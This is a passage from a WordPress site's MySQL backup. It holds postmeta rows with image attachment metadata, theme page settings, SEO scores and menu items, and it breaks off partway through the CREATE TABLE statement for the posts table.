s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20160323-WA0003-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20160323-WA0003-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2365","1114","_wp_attached_file","2017/01/IMG-20161220-WA0026.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2366","1114","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0026.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0026-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0026-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0026-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0026-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0026-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0026-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0026-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0026-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2367","1115","_wp_attached_file","2017/01/IMG-20161220-WA0030.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2368","1115","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0030.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0030-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0030-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0030-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0030-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0030-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0030-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0030-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0030-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2369","1116","_wp_attached_file","2017/01/pls-stand-1.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2370","1116","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1200;s:6:\"height\";i:1600;s:4:\"file\";s:23:\"2017/01/pls-stand-1.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:23:\"pls-stand-1-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:23:\"pls-stand-1-225x300.jpg\";s:5:\"width\";i:225;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:24:\"pls-stand-1-768x1024.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:24:\"pls-stand-1-768x1024.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:23:\"pls-stand-1-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:23:\"pls-stand-1-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:23:\"pls-stand-1-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:21:\"pls-stand-1-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:14:\"Mustafa ülgen\";s:6:\"camera\";s:9:\"HTC_P3450\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:10:\"1245773102\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2371","1117","_wp_attached_file","2017/01/IMG-20161220-WA0031.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2372","1117","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0031.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0031-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0031-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0031-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0031-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0031-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0031-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0031-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0031-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2373","1118","_wp_attached_file","2017/01/IMG-20161220-WA0032.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2374","1118","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0032.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0032-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0032-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0032-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0032-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0032-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0032-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0032-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0032-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2375","1119","_wp_attached_file","2017/01/IMG-20161220-WA0033.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2376","1119","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0033.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0033-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0033-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0033-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0033-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0033-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0033-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0033-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0033-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2377","1120","_wp_attached_file","2017/01/Untitled-1-copy.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2378","1120","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1110;s:6:\"height\";i:709;s:4:\"file\";s:27:\"2017/01/Untitled-1-copy.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:27:\"Untitled-1-copy-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:27:\"Untitled-1-copy-300x192.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:192;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:27:\"Untitled-1-copy-768x491.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:491;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:28:\"Untitled-1-copy-1024x654.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:654;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:27:\"Untitled-1-copy-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:27:\"Untitled-1-copy-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:27:\"Untitled-1-copy-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:25:\"Untitled-1-copy-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2379","1121","_wp_attached_file","2017/01/IMG-20161220-WA0034.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2380","1121","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0034.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0034-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0034-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0034-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0034-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0034-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0034-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0034-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0034-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2381","1122","_wp_attached_file","2017/01/IMG-20161220-WA0035.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2382","1094","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("2383","1094","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("2384","1094","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("2385","1094","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("2386","1094","er_leaf_page_title","1");
INSERT INTO `cmrfu_postmeta` VALUES("2387","1094","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("2388","1094","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("2389","1094","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("2390","1094","er_leaf_portfolio_enable_filter","1");
INSERT INTO `cmrfu_postmeta` VALUES("2391","1094","_yoast_wpseo_content_score","30");
INSERT INTO `cmrfu_postmeta` VALUES("2392","1122","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0035.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0035-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0035-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0035-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0035-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0035-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0035-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0035-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0035-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2393","1087","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("2394","1087","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("2395","1087","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("2396","1087","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("2397","1087","er_leaf_page_title","1");
INSERT INTO `cmrfu_postmeta` VALUES("2398","1087","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("2399","1087","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("2400","1087","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("2401","1087","er_leaf_portfolio_enable_filter","1");
INSERT INTO `cmrfu_postmeta` VALUES("2402","1087","_yoast_wpseo_content_score","60");
INSERT INTO `cmrfu_postmeta` VALUES("2403","1125","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("2404","1125","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("2405","1125","_menu_item_object_id","1087");
INSERT INTO `cmrfu_postmeta` VALUES("2406","1125","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("2407","1125","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("2408","1125","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("2409","1125","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("2410","1125","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("2421","1125","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("2412","1126","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("2413","1126","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("2414","1126","_menu_item_object_id","1094");
INSERT INTO `cmrfu_postmeta` VALUES("2415","1126","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("2416","1126","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("2417","1126","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("2418","1126","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("2419","1126","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("2422","1126","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("2426","924","_wp_old_slug","herkon-yapi");
INSERT INTO `cmrfu_postmeta` VALUES("2427","1130","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("2428","1130","_edit_lock","1489219060:1");


DROP TABLE IF EXISTS `cmrfu_posts`;

CREATE TABLE `cmrfu_posts` (
  `ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `post_author` bigint(20) unsigned NOT NULL DEFAULT '0',
  `post_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_date_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_content` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_title` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_excerpt` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'publish',
  `comment_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'open',
  `ping_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'open',
  `post_password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `post_name` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `to_ping` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `pinged` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_modified_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_content_filtered` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_parent` bigint(20) unsigned NOT NULL DEFAULT '0',
  `guid` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `menu_order` int(11) NOT NULL DEFAULT '0',
  `post_type` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'post',
  `post_mime_type` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_count` bigint(20) NOT NULL DEFAULT '0',
  PRIMARY KEY (`ID`),
  KEY `type_status_date` (`post_type`,`post_status`,`post_date`,`ID`),
  KEY `post_parent` (`post_parent`),
  KEY `post_author` (`post_author`),
